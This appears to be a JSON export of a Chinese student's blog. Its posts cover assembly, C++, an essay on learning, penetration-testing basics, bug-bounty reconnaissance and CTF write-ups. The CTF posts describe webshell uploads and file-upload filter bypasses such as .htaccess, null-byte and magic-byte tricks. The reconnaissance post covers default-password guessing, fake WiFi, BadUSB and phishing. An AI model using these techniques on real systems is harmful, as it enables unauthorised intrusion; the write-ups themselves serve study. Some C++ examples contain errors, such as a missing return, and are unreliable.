例子：;启动代码部分.text;将myFunc定义为全局(导出)函数.globl myFunc.type myFunc, @functionmyFunc :;子程序序言push %ebp ;保存基指针旧值mov %esp, %ebp ;设置基指针新值sub $4, %esp ;为一个 4 字节的变量腾出位置push %edipush %esi ;这个函数会修改 EDI 和 ESI, 所以先给它们入栈;不需要保存 EBX, EBP 和 ESP;子程序主体mov 8(%ebp), %eax ;把参数 1 的值移到 EAX 中mov 12(%ebp), %esi ;把参数 2 的值移到 ESI 中mov 16(%ebp), %edi ;把参数 3 的值移到 EDI 中mov %edi, -4(%ebp) ;把 EDI 移给局部变量add %esi, -4(%ebp) ;把 ESI 添加给局部变量add -4(%ebp), %eax ;将局部变量的内容添加到EAX(最终结果)中;子程序结尾pop %esi ;恢复寄存器的值pop %edimov %ebp, %esp ;释放局部变量pop %ebp ;恢复调用者的基指针值ret 子程序序言执行标准操作，即在EBP中保存栈指针的副本，通过递减栈指针来分配局部变量，并在栈上保存寄存器的值。 函数的结尾则基本上是函数序言的镜像，从栈上恢复调用者的寄存器值，通过重置栈指针来释放局部变量，恢复调用者的EBP值，并使用ret指令返回调用者中相应代码位置。","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"渗透测试01","slug":"渗透测试01","date":"2025-06-12T16:00:00.000Z","updated":"2025-06-13T09:26:21.856Z","comments":true,"path":"2025/06/13/渗透测试01/","permalink":"https://incldue.github.io/2025/06/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9501/","excerpt":"对渗透测试了解的第一课，一些基础知识~","text":"渗透测试010x0.介绍 渗透测试就是一种通过模拟恶意攻击者的技术&amp;方法，挫败目标系统安全控制措施、取得访问控制权、同时发现具备业务影响后果安全隐患的安全测试与评估方式。 其一般需要对系统进行目标系统进行主动探测分析，以发现潜在的系统漏洞（包括不恰当的系统配置、已知或未知的软件硬件漏洞，以及在安全计划与响应过程中的操作性弱点…） 0x1.分类 黑盒测试（外部测试），设计为模拟一个对客户组织一无所知的攻击者所进行的渗透测试。 a.采用该方式时，渗透测试人员将从一个远程网络位置来评估目标网络基础设施。值得注意的是，他们并没有任何目标网络内部拓扑等相关信息，即完全模拟外部攻击者，采用流行的攻击技术&amp;工具对目标组织进行逐步的渗透与入侵，揭示目标网络中的已知&#x2F;未知安全漏洞，并评估这些漏洞是否能被利用来获取控制权&#x2F;造成相关业务资产的损失。 b.黑盒测试比较费时费力，同时也需要具备较高的技术能力。因此，也更受推崇。 白盒测试（内部测试），设计为人员在拥有客户组织所有知识的情况下所进行的渗透测试。 a.采用该方法时，渗透测试人员可以了解到关于目标环境的所以内部&amp;底层知识 &#x3D;&gt; 以最小代价发现&amp;验证系统中最严重的安全漏洞。 b.白盒测试无需进行目标定位与情报搜集（在CTF中，一般是进行黑盒测试）；同时，其能够更加方便地在一次常规开发&amp;部署计划周期中集成，避免被入侵者发现利用可能存在的安全漏洞。 c.其无法有效测试客户组织的应急响应程序。 灰盒测试（白+黑的组合） a.灰盒测试需要渗透测试人员能够根据对目标系统所掌握的有限知识与信息，来评估整体安全性的最佳途径。 b.简单来说，结合了黑盒测试&amp;白盒测试的各自优点。 0x2.渗透测试阶段 前期交互：确定渗透测试的范围、目标、限制条件以及业务目标… 情报搜集（白盒测试无）：获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息 a.可以使用的方法包括公开来源信息查询、Google Hacking、社会工程学（社工，哈哈）、网络踩点、扫描探测（类似于嗅探）、被动监听、服务查点… 威胁建模：通过共同的缜密情报分析&amp;攻击思路brainstorm，可以确定最可行的攻击通道。 漏洞分析（如何root&#x2F;提权）：综合分析+找出攻击点+验证 渗透攻击（真正提权）：考虑系统特性+挫败防御措施（+考虑检测机制的逃逸–黑盒） 后渗透攻击：根据目标组织不同特点，自主设计攻击目标+寻找最具价值的信息&amp;资产，达成攻击途径。 0x3.安全漏洞生命周期 利用安全漏洞来造成入侵&#x2F;破坏效果的程序为渗透代码（EXP–CTF中的老朋友了啊）。 安全漏洞研究&amp;挖掘：主要利用源代码审计（白盒测试）+逆向工程（灰盒测试）+Fuzz测试（黑盒测试）等方法，挖掘可用漏洞。 渗透代码开发与测试：黑客们会开发概念验证性的渗透代码 &#x3D;&gt; POC，用于验证漏洞是否存在。 安全漏洞&amp;渗透代码在团队内流传：“白帽”会通知厂商修补，后者给出补丁后再发布；“黑帽”以及“灰帽”则会各自进行秘密共享，以充分利用其所带来的攻击价值。 安全漏洞&amp;渗透代码开始扩散：安全漏洞和渗透代码最终被披露出来，在互联网上得以发布。 恶意程序出现+传播：“黑帽”在掌握安全漏洞&amp;渗透代码的基础上，进一步开发更易使用、更具有自动化传播能力的恶意程序，并通过社区、组织、互联网传播，进而快速扩散。 渗透代码&#x2F;恶意程序大规模扩散，造成危害：厂商发布补丁和安全警报让更多黑客了解，从而加以利用。 渗透代码&#x2F;攻击工具&#x2F;恶意程序&#x3D;&gt;消亡：检测&amp;移除机制得到广泛使用。 [!IMPORTANT] 1.Patch为补丁； 2.从安全漏洞被发现到厂商发布Patch用于修补该漏洞之前的这段期间，称为0day； 3.在这段时间里，黑客攻击存有“0day”漏洞的目标可达到100%成功率，同时也可以躲避检测，因此“0day”和对应的渗透代码对与黑客社区有很高价值。 0x4.安全漏洞资源库国内： CNNVD:中国国家漏洞库 CNVD:中国国家信息安全漏洞共享平台 国外： CVE（通用漏洞与披露）：已成为安全漏洞命名索引的业界事实标准 NVD：国家漏洞数据库，是美国政府官方根据NIST的SCAP标准协议所描述的安全漏洞管理信息库 SecurityFocus：起源于Bugtraq邮件列表。 OSVDB：开源漏洞数据库，一个独立、开源的安全漏洞信息库","categories":[{"name":"安全相关","slug":"安全相关","permalink":"https://incldue.github.io/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://incldue.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"SRC挖洞01--信息收集_1","slug":"SRC挖洞01--信息收集_1","date":"2025-06-10T16:00:00.000Z","updated":"2025-06-12T06:28:30.876Z","comments":true,"path":"2025/06/11/SRC挖洞01--信息收集_1/","permalink":"https://incldue.github.io/2025/06/11/SRC%E6%8C%96%E6%B4%9E01--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_1/","excerpt":"SRC挖洞第一步，知己知彼---信息收集","text":"SRC挖洞01–信息收集_10x0.目的 为什么要进行信息收集呢？这就好比我们出去旅游得做攻略了解当地习俗（吃喝玩乐），亦或是出去露营要了解环境怎么样、当天的天气咋样… 同样，SRC挖洞类似，你必须知道要面对什么，才能做好充足的准备。 0x1.获取途径 Whois信息：关于域名的基本信息。其显示了网站的注册详细信息（包括注册域名的用户&amp;该域名的到期时间等）。在社交工程学中很有用。 IP地址：其由域名服务器解析，可以帮助我们定位网络，同时在测试时查找系统上的开放端口&amp;其他可利用资源及服务等等。 Web服务器：是运行在OS上的应用程序，如Apache、Tomcat、IIS等等都是。当任何Web请求被发送到系统时，这些Web服务器会处理并发出响应。知道了Web服务器类型，也就能找到该服务器的默认目录及漏洞。 登录页面：这也是常出现漏洞的地方（SQL注入、弱口令…）。想进入admin页面或是获得敏感数据，就得有钥匙，可以是万能的（比如admin|admin@123、admin|123456…），或者直接爆破也行… 子域名：我们需要收集到域名下的所有可用的子域名，这样可能会发现隐藏或是私有域。而这些有在被维护的就很容易收到攻击（洪泛攻击…） 同一服务器上的其他域：很多时候没办法在目标站找到漏洞时，可以尝试通过查找反向IP域并查找同一服务器上的其他网站来locate漏洞。 Web应用程序防火墙：除了上述所讲，我们还可以测试是否使用防火墙。这样，我们可以知道要面对的&amp;有无可以绕过该防火墙的方法。 0x2.两维度 网站框架： a. CMS、接口信息、数据库信息、编程语言、前端载体 b. OS、IP信息、CDN信息、端口协议、DNS信息、域名信息 企业相关框架： a. IP C段信息、历史备案信息、鹰图hunter&#x2F;FOFA信息 b. SRC公告中信息（测试范围…）、域名信息、企查查&#x2F;天眼查&#x2F;小蓝本信息 0x3.信息打点方向 目标公司相关： a.看目标直接开放的资产业务… b.相关单位（迂回战术）：企业总部的安全防护做得比较严格，难以正面攻破。这时，可以选择其下属单位来试试；还有就是，一个集团内部的各个分公司之间的内网隔离不彻底，可以由一个内网进入同一集团下另一分公司的内网中进行信息收集。 供应商（供应链攻击）：集中在上下游供应商，找到漏洞，攻击企业内部 a.商业购买系统 b.软件开发商 c.外包相关业务 d.代理商 e.招标&amp;投标文件 0x4.常见打点思路 远程Web打点 a.互联网边界资产：部分开放于互联网的设备或系统（邮件、官网…） b.通用产品组件漏洞：自身安全漏洞（OA漏洞、中间件漏洞、数据库漏洞…） c. 0Day漏洞：0day漏洞能够穿透现有基于规则的防护技术。这些漏洞大部分和暴露在互联网上的Web应用相关，直接威胁到core的安全。 d. 弱口令：包括但不限于弱强度密码、默认密码、通用密码…但是现在好像基本上没见到啥弱口令了 近源攻击 a.线下门店WiFi：常见的连接方式有万能钥匙、密码爆破…像星巴克等等门店都可以进行。 b.WiFi伪造：干扰正常的WIFI运行，伪造同名的WiFi来等待目标现场的工作人员连接，再分析抓到的数据包，看看是否存在相关的关键业务地址、密码等等。 c. BadUSB：制作干扰U盘找间隙插入工作人员的电脑上，通过模拟键盘按下来执行系统命令等等。 社交工程学钓鱼攻击 a.电子邮件钓鱼 b.通讯软件钓鱼（QQ、微信等） c.最常见的网页钓鱼 d.电话社工（比较常见） e.水坑攻击 未完待续…","categories":[{"name":"安全相关","slug":"安全相关","permalink":"https://incldue.github.io/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"SRC挖洞","slug":"SRC挖洞","permalink":"https://incldue.github.io/tags/SRC%E6%8C%96%E6%B4%9E/"}]},{"title":"CTF--文件上传漏洞PLUS","slug":"CTF--文件上传漏洞PLUS","date":"2025-06-06T16:00:00.000Z","updated":"2025-06-12T06:25:24.998Z","comments":true,"path":"2025/06/07/CTF--文件上传漏洞PLUS/","permalink":"https://incldue.github.io/2025/06/07/CTF--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EPLUS/","excerpt":"之前只是了解知识点，这回做了赛题才发现有很多没懂的...","text":"CTF文件上传漏洞例题总结题目是NSSCTF上的“[SWPUCTF 2021 新生赛]easyupload1.0” 解题思路：1.打开题目靶机环境： 2.老套路，上传一句话木马，但是提示上传失败： 3.看看提示，upload1.jpg,于是将原有的🐎后缀名改为.jpg，提示上传成功并给出文件路径： 4.随后，用bp抓包，放入Repeater,并将文件名修改为.phtml： 5.最后，根据文件路径访问&#x2F;upload&#x2F;test.phtml，Ctrl+F搜索flag即可(这里则是NSSCTF)： 总结：这次试了才发现有点耗时…之前一直没敢做这种，感觉太复杂了~~ 不过，这是个好的开始！","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CTF赛题","slug":"CTF赛题","permalink":"https://incldue.github.io/tags/CTF%E8%B5%9B%E9%A2%98/"}]},{"title":"SRC挖洞00","slug":"SRC挖洞00","date":"2025-06-02T16:00:00.000Z","updated":"2025-06-12T06:28:46.130Z","comments":true,"path":"2025/06/03/SRC挖洞00/","permalink":"https://incldue.github.io/2025/06/03/SRC%E6%8C%96%E6%B4%9E00/","excerpt":"只是简单的announce一下，开始学习SRC挖洞咯~~","text":"之前因为某些原因，想到了Social engineering，想要小小的社工一下… 在参加CTF比赛时，也在MISC里面接触到了社工题&amp;一些“信息收集”、“POC打点”等等术语。 随后就心血来潮搜索一番，发现玩这玩意儿还有奖励、bonus!!! 于是，正式入坑SRC挖洞了 :)","categories":[{"name":"安全相关","slug":"安全相关","permalink":"https://incldue.github.io/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"SRC挖洞","slug":"SRC挖洞","permalink":"https://incldue.github.io/tags/SRC%E6%8C%96%E6%B4%9E/"}]},{"title":"C++学习02","slug":"C++学习02","date":"2025-06-01T16:00:00.000Z","updated":"2025-06-12T06:27:11.440Z","comments":true,"path":"2025/06/02/C++学习02/","permalink":"https://incldue.github.io/2025/06/02/C++%E5%AD%A6%E4%B9%A002/","excerpt":"学习OOP时的一些知识点，涉及继承&多态&文件与流","text":"继承 继承让我们能依据另一个类来定义一个类，这种特性也很容易创建和维护一个程序，从而达到了重用代码功能和提高执行效率的一个效果。 ​ 当创建一个类时，无需重新编写新的数据成员、成员函数，只需指定该类继承一个已有类的成员即可， ​ 上述已有类称为基类，新建类则为派生类。 语法： a.基本：class子类(派生类) : 继承方式 父类(基类) class A&#123; public: int a; protected: int b; private: int c;&#125;; b.共有继承：基类的公用成员和保护成员在派生类中保持原有访问属性，其私有成员仍为私有。 class B : public A&#123; public: int a; protected: int b; //不可访问: int c;&#125;; c.私有继承：基类的公用成员和保护成员在派生类中变为私有属性，其私有成员仍为私有。 class B : private A&#123; private: int a; int b; //不可访问 int c;&#125;; d.保护继承：基类的公用成员和保护成员在派生类中变为保护属性，其私有成员仍为私有。 class B : protected A&#123; protected: int a; int b; //不可访问 int c;&#125;; 多继承：一个子类可有多个父类，继承多个父类的特性。 语法： class &lt;派生类名&gt;:&lt;继承方式1&gt;&lt;基类1&gt;,&lt;继承方式2&gt;&lt;基类2&gt;,...&#123; &lt;派生类类体&gt;&#125;; [!NOTE] 访问修饰符继承方式可以是public、protected或private中的任何一个。 其他注意： a.派生类是不能继承基类的析构函数，也需要通过派生类的析构函数调用基类的析构函数。 b.继承中先调用父类构造函数，再调用子类的，析构函数的调用顺序与之相反。 c.C++中构造函数不能被派生类继承！ 多态 多态指具有不同功能的函数可以用同一个函数名。 这也意味在调用成员函数时会根据调用函数的对象的不同类型来执行不同函数。 当类之间存在层次结构&amp;&amp;类之间通过继承关联时，会用到多态。 静态多态：函数重载、运算符重载 a.重载声明指一个与之前已在该作用域内声明过的函数&#x2F;方法具有相同名称的声明，但参数列表和定义不同。 b.函数重载：同名函数功能类似，但形式参数必须不同。 class Print&#123; public: void print(int m) &#123; cout&lt;&lt;&quot;整数为：&quot;&lt;&lt;m&lt;&lt;endl; &#125; void print(double n) &#123; cout&lt;&lt;&quot;浮点数为：&quot;&lt;&lt;n&lt;&lt;endl; &#125; void print(char chr[]) &#123; cout&lt;&lt;&quot;字符串为：&quot;&lt;&lt;chr&lt;&lt;endl; &#125;&#125;;int main()&#123; Print p; p.print(5); p.print(3.14159); char chr[]=&quot;h3llo_w0rld&quot;; p.print(chr); return 0;&#125; c.运算符重载：运算符为带有特殊名称的函数，函数名由关键字operator和运算符符号构成。同时，重载运算符也有一个返回类型与一个参数列表。 //语法Box operator+(const Box&amp;); //类成员函数Box operator+(const Box&amp;, const Box&amp;); //类的非成员函数//示例class Box&#123; public: double getVolume(void) &#123; return length * breadth * height; &#125; void setLength(double len) &#123; length = len; &#125; void setBreadth(double bre) &#123; breadth = bre; &#125; void setHeight(double hei) &#123; height = hei; &#125; //重载+运算符，把两Box对象相加 Box operator+(const Box&amp; b) &#123; Box box; box.length = this-&gt;length + b.length; box.breadth = this-&gt;breadth + b.breadth; box.height = this-&gt;height + b.height; &#125; private: double length; double breadth; double height;&#125;; 运算符列表： 动态多态：派生类和虚函数实现运行时多态 a.虚函数 是在基类中使用关键字virtual声明的函数。在派生类中重新定义基类中的定义的虚函数时，会告诉编译器不要静态链接到基类中的该函数。 class Shape&#123; protected: int width, height; public: Shape(int a=0, int b=0) &#123; width = a; height = b; &#125; virtual int area() &#123; cout&lt;&lt;&quot;Parent class area: &quot;&lt;&lt;endl; return 0; &#125; //纯虚函数 virtual int area() = 0;&#125;; 文件与流 **基本输入输出(I&#x2F;O)发生在流(字节序列)**中。 文件操作：从文件读取流和向文件写入流。 a.打开文件： void open(const char *filename, ios::openmode mode);//第一个参数指定文件名称&amp;位置，第二个参数定义文件被打开的模式 打开模式： //以写入模式打开文件，并希望截断文件ofstream out;out.open(&quot;file.dat&quot;, ios::out | ios::trunc);//打开一个文件用于读写ifstream afile;afile.open(&quot;file.dat&quot;, ios::out | ios::in); b.关闭文件： void close(); //close()是fstream、ifstream和ofstream对象的一个成员 c.读取&amp;写入示例代码： #include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; char data[105]; //已写模式打开文件 ofstream outfile; outfile.open(&quot;afile.dat&quot;); cout&lt;&lt;&quot;Writing...&quot;&lt;&lt;endl; cout&lt;&lt;&quot;Name: &quot;; cin.getline(data, 105); outfile&lt;&lt;data&lt;&lt;endl; //数据写入文件 cout&lt;&lt;&quot;Age: &quot;; cin&gt;&gt;data; cin.ignore(); //ignore()函数会忽略之前读语句留下的多余字符。 outfile&lt;&lt;data&lt;&lt;endl; outfile.close(); //以读模式打开文件 ifstream infile; infile.open(&quot;afile.dat&quot;); cout&lt;&lt;&quot;Reading...&quot;&lt;&lt;endl; infile&gt;&gt;data; cout&lt;&lt;data&lt;&lt;endl; infile&gt;&gt;data; cout&lt;&lt;data&lt;&lt;endl; infile.close(); return 0;&#125; 后记这个时间点的C++学习…懂得都懂 :)","categories":[{"name":"程序设计","slug":"程序设计","permalink":"https://incldue.github.io/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"编程学习","slug":"编程学习","permalink":"https://incldue.github.io/tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"}]},{"title":"Db8Gr的blog01","slug":"Db8Gr的blog01","date":"2025-05-31T16:00:00.000Z","updated":"2025-06-12T14:33:28.015Z","comments":true,"path":"2025/06/01/Db8Gr的blog01/","permalink":"https://incldue.github.io/2025/06/01/Db8Gr%E7%9A%84blog01/","excerpt":"...reboot...","text":"重启后的第一篇文章…现在是2025-06-01的凌晨一点，(￣▽￣)”确实，是时候重新审视自己了，唉…","categories":[{"name":"杂谈","slug":"杂谈","permalink":"https://incldue.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://incldue.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"C++学习01","slug":"C++学习01","date":"2025-05-22T16:00:00.000Z","updated":"2025-06-12T06:27:11.442Z","comments":true,"path":"2025/05/23/C++学习01/","permalink":"https://incldue.github.io/2025/05/23/C++%E5%AD%A6%E4%B9%A001/","excerpt":"学习OOP时记录的一些知识点，涉及内存模型&函数","text":"程序的内存模型1.内存四区 ​ 代码区、全局区、栈区、堆区（代码区和全局区在程序执行前就有） 2.简单介绍 ​ 2.1 代码区： ​ 存放CPU执行的机器指令 ​ 代码区是共享的，也是只读的。 ​ 2.2 全局区： ​ 存放了全局变量（在main函数之外）、静态变量（前面有static) ​ 其中还包含了常量区。（包括字符串常量、const修饰的全局常量） ​ 该区的数据在程序结束后由操作系统释放。 ​ 2.3 栈区： ​ 由编译器自动分配释放（函数执行完） ​ 存放函数的参数值（形参）、局部变量等（不要返回局部变量的地址！！） ​ 2.4 堆区： ​ 由程序员分配释放，若不释放，则被系统回收 ​ 主要用new关键字在该区开辟数据，用delete关键字释放内存。 ​ new返回的是数据类型的指针。 ​ 释放数组时（eg. delete[] arr;） 构造函数&amp;析构函数 构造函数用于初始化对象，同时为对象的成员属性赋值；析构函数用于清理对象，同时在对象销毁前调用执行清理工作。 语法 2.1 构造函数：类名(){} ​ 2.1.1.构造函数，没有返回值也不写void ​ 2.1.2.构造函数可以有参数，可以发生重载 2.2 析构函数：~类名(){} ​ 2.2.1.析构函数，没有返回值也不写void ​ 2.2.2.析构函数不可以有参数，不可以发生重载 3.构造函数的分类&amp;调用 ​ 3.1 分类一（按照参数） ​ 3.1.1.无参构造（默认构造） ​ 3.1.2.有参构造 ​ 3.2 分类二（按照类型） ​ 3.2.1.普通构造 ​ 3.2.2.拷贝构造： Person(const Person &amp;p)&#123; 、、、 、、、&#125; ​ 3.3 调用 ​ 3.3.1.括号法： Person p1; //默认构造Person p2(20); //有参构造Person p3(p2); //拷贝构造 ​ 3.3.2.显示法： Person p1;Person p2 = Person(20); //有参构造Person p3 = Person(p2); //拷贝构造 ​ 3.3.3.隐式转换法： Person p4 = 20; //有参构造（相当于Person p4 = Person(20);）Person p5 = p4; //拷贝构造 ​ 3.4 深拷贝&amp;浅拷贝 ​ 3.4.1.浅拷贝：简单的赋值拷贝操作（存在的问题：使堆区的内存重复释放） ​ 3.4.2.深拷贝：在堆区重新申请空间，从而进行拷贝操作 ​ 3.4.3.示例： Person(const Person&amp; p) &#123; //深拷贝 cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; m_Age = p.m_Age; //m_Height = p.m_Height; //编译器默认实现 m_Height = new int(*p.m_Height);&#125;~Person() &#123; //析构代码，将堆区所开辟的数据释放 if (m_Height != NULL) &#123; delete m_Height; m_Height = NULL; &#125; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl;&#125; const修饰成员函数常函数： ​ 1.成员函数后加const，称之为常函数 ​ 2.常函数内不可以修改成员属性 ​ 3.成员属性声明时加关键字mutable，在常函数中依然可以修改 常对象： ​ 1.声明对象前加const，称为常对象 ​ 2.常对象只能调用常函数 未完待续…","categories":[{"name":"程序设计","slug":"程序设计","permalink":"https://incldue.github.io/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"编程学习","slug":"编程学习","permalink":"https://incldue.github.io/tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF--Web的请求头伪造（简单的Wp）","slug":"CTF--Web的请求头伪造（简单的Wp）","date":"2025-05-15T16:00:00.000Z","updated":"2025-06-12T06:25:24.986Z","comments":true,"path":"2025/05/16/CTF--Web的请求头伪造（简单的Wp）/","permalink":"https://incldue.github.io/2025/05/16/CTF--Web%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BC%AA%E9%80%A0%EF%BC%88%E7%AE%80%E5%8D%95%E7%9A%84Wp%EF%BC%89/","excerpt":"Web的HTTP请求头伪造","text":"题目描述WEB入门5-请求头伪造 在发生HTTP请求时，往往会带上许多请求头，这些请求头是可以被我们所控制的，倘若服务端没有进行校验而轻易相信，便会出现安全问题，试试解决这个问题吧！ 解决1.将cookie中的guest权限改为admin，同时增加题述中的发出请求的用户的电子邮件地址（From:…） 2.接着增加其他题述中的请求头：X-forwards-for(从内网访问：127.0.0.1）、Via（通知中间网关或代理服务器地址，通讯协议）。 3.得到flag 请求头相关链接[CTF——HTTP发送头Headers整理](CTF——HTTP发送头Headers整理_ctf easyheader-CSDN博客)。","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"CTF-文件上传漏洞","slug":"CTF-文件上传漏洞","date":"2025-05-12T16:00:00.000Z","updated":"2025-06-12T06:25:24.986Z","comments":true,"path":"2025/05/13/CTF-文件上传漏洞/","permalink":"https://incldue.github.io/2025/05/13/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"文件上传漏洞之前做了CTF的一道题，考察了文件上传，在此复习下文件上传。","text":"文件上传漏洞之前做了CTF的一道题，考察了文件上传，在此复习下文件上传。 文件上传漏洞原因：1.服务器配置不当2.文件上传限制被绕过3.开源编辑器的上传漏洞4.文件解析漏洞导致文件执行5.过滤不严或被绕过 可能存在漏洞的位置：1.图片上传功能 2.头像上传功能 3.文档上传功能 文件上传检测方式：1.客户端JS检测（文件扩展名）2.服务端MIME类型检测（content-type内容）3.服务端目录路径检测（跟path参数相关）4.服务器文件扩展名检测（跟文件extension相关）5.服务端文件内容检测（内容是否合法、是否含有恶意代码） 绕过客户端检测：1.原理：在上传页面里含有专门检测文件上传的JS代码，最常见的则是检测文件类型和扩展名是否合法2.方法：在本地浏览器客户端禁用JS即可3.测试：靶场 绕过服务端检测：1.服务端代码检测三点：MIME类型、文件后缀、文件内容2.常见MIME类型​ 1.HTML、txt、pdf​ 2.Word、png、gif​ 3.MPEG、AVI3.绕过MIME类型检测​ 1.原理：检测图片类型文件上传过程中http包的Content-Type字段的值，从而判断文件是否合法​ 2.方法：用BP截取并修改数据包中文件的Content-type类型来进行绕过 绕过文件后缀检测–黑名单1.后缀大小写绕过（.Php)2.空格绕过（.php ）3.点绕过（.php.）4.::DATA绕过(利用Windows下NTFS文件系统的特性,可在文件后缀名加::DATA绕过5.配合Apache解析漏洞（Apache解析有一个特点：解析从右向左，若为不可识别的则继续从左解析，Apache不解析.rar和.owf。）6..htaccess文件 1.配合名单列表绕过，上传一个自定义的.htaccess，就可绕过各种检测 2…htaccess文件（分布式配置文件）提供了针对目录改变配置的方法。 绕过文件后缀检测–白名单1.绕过方法：服务端判断文件类型是从后往前判断，而解析则是与判断相反，可用00截断的方式绕过，%00与0x00截断2.系统在对文文件名读取时，若遇到0x00,则认为读取结束。 绕过文件内容检测1.通过检测文件幻数来判断：通常，通过判断文件前10个字节，即可判断文件的真实类型。 1.绕过jpg类型的文件幻数检测要在文件开头写Value&#x3D;FF D8 FF E0 00 10 4A 49 46 2.绕过gif类型的文件幻数检测则要加Value&#x3D;47 49 46 38 39 61 3.绕过png的，则要加Value&#x3D;89 50 4E 472.通过检测文件加载：一般是调用API或函数进行文件加载测试，常见的则是图像渲染测试，那我们对渲染&#x2F;加载 测试的攻击方式时代码注入绕过，对二次渲染的则是攻击文件加载器自身。 总结：我们可以用溢出攻击对文件加载器进行攻击，上传自己的恶意代码后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode。","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"程序员关于学习的10件事[摘自...貌似忘了:(,emmm... ]","slug":"（转载）程序员关于学习的10件事","date":"2025-04-25T16:00:00.000Z","updated":"2025-06-12T06:20:25.238Z","comments":true,"path":"2025/04/26/（转载）程序员关于学习的10件事/","permalink":"https://incldue.github.io/2025/04/26/%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%E7%A8%8B%E5%BA%8F%E5%91%98%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E7%9A%8410%E4%BB%B6%E4%BA%8B/","excerpt":"感觉写得真挺好的，“never too old to learn”！！！","text":"（转载）程序员关于学习的10件事0.前言终身学习，对每个人都可能是必要，对于软件工程师尤其如此。在IT领域，变化是永恒的，新技术不断被发明，旧技术不断更新。因此，软件工程师不会只学习一次编程，还可能要学习许多新的编程语言和框架。 但是，我们学习并不意味着我们理解了如何学习，人们不能凭直觉理解记忆和学习是如何工作的。认知心理学和关于编程的教育为我们如何学习提供了强有力的见解。本文阐述了关于学习的10件事，这些发现适用于软件工程师，并有着实际的意义。 1. 人的记忆不是由比特组成的记忆是学习的核心，学习意味着一个人的长期记忆发生了变化。软件开发人员都熟悉计算机内存的惊人力量，在那里可以存储一系列的比特，然后通过CPU的控制调整为正确的比特序列。尽管人的记忆有其相似性，但它既不准确，也不可靠。 由于人类记忆的生物学复杂性，可靠性是一个复杂的问题。对于计算机内存，我们使用两种基本操作: 读和写。读取计算机内存不会修改它，也不管写入和读取之间经过多少时间。人的记忆似乎有一个“读取和更新”的操作，在这个操作中，获取一段记忆可以加强和修改它。这种修改更有可能发生在最近形成的记忆上。由于这种修改的可能性，事实不存在于确定已知或未知的二元状态; 它可以存在中间状态。我们可以忘记以前知道的事情，知识可能是不可靠的。 人类记忆的另一个奇特特征是“扩散激活”。我们的记忆储存在相互连接的神经通路中，当试图记住一些东西时，我们会激活一条神经元通路来获取目标信息。然而，激活并不只包含在一个途径中。有些激活会扩散到其他相连的通道，这种扩散的激活使得相关的通路被激活数小时。传播激活对记忆有负面影响，对解决问题有正面影响。传播激活意味着相关但不精确的信息可能与目标信息混为一谈，这意味着对信息的回忆可能是不可靠的。然而，传播激活也与基于洞察力的问题解决或“顿悟时刻”有关，有时候离开一个问题去解决另一个问题，这个问题本身就在扩散，导致两个不相关的区域在中间连接起来。当两个先前不相关的领域连接起来时，就会产生创造性和独特的问题解决方案。这或许就是为什么散步，淋浴，或者其他远离问题的时间里可以帮助我们摆脱困境问题原因。 总而言之，人的记忆不是简单地从特定位置存储和检索就可以工作的，它更加脆弱和不可靠，但是，它也可以通过将知识联系在一起来，为解决问题和深入理解带来好处。 2. 人的记忆是由一个有限的和一个无限的系统组成人类记忆与学习相关的部分有两个主要的组成: 长时记忆和工作记忆。长时记忆是信息永久存储的地方，其功能是无限的，在这个意义上，它有点像计算机的磁盘存储器。然而，工作记忆用于有意识地推理信息以解决问题，它类似于 CPU 的寄存器，实时存储有限数量的信息以允许访问和操作。 